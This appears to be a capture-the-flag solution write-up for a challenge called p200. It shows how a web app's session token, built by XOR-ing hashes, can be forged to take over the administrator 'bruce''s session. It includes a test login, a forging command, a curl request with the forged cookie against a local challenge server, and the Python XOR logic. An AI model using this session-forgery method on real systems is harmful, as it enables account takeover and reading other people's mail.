Solution
========

  * Try to login using an username with a non-alphanumeric
    character and look at the fake **error page** to see how the
    session token is being generated (the username hash is _xor_'ed
    with the key hash). In here we can also see that the app is
    installed in **bruce**'s home directory (which tells us that
    bruce is the system administrator and, thus, our target).

  * Login with user `pjsmith` and password `freire7f1` and
    get the session ID. The only email in pjsmith's inbox comes
    from the system administrator, which is called **bruce** (
    this is another way to find who our victim is).

  * Run this to get the session ID for the `bruce` user:

        $ ./test_p200.py pjsmith:da32ae0cbb112f74a43dd2bd39b8592bfcfbae57 bruce

  * Now you can look at bruce's email with:

        $ curl -H 'Cookie: csrftoken=U3g7HfBKsra6wLwf1wE8XZdtnBnsmQrJ; sessionid="bruce:ccbf1fb417b28a6ea609d57af60f725d320e50bb"' http://127.0.0.1:8753/viewmail/1/

Look into `test_p200.py` for the details of how the victim's session ID
is obtained:

```python
user_hash = sha1(user).digest()
victim_hash = sha1(victim).digest()
hash_xor = string_xor(user_hash, victim_hash)

victim_session = string_xor(session, hash_xor).encode("hex")
```

Also, check this: https://en.wikipedia.org/wiki/Stream_cipher_attack
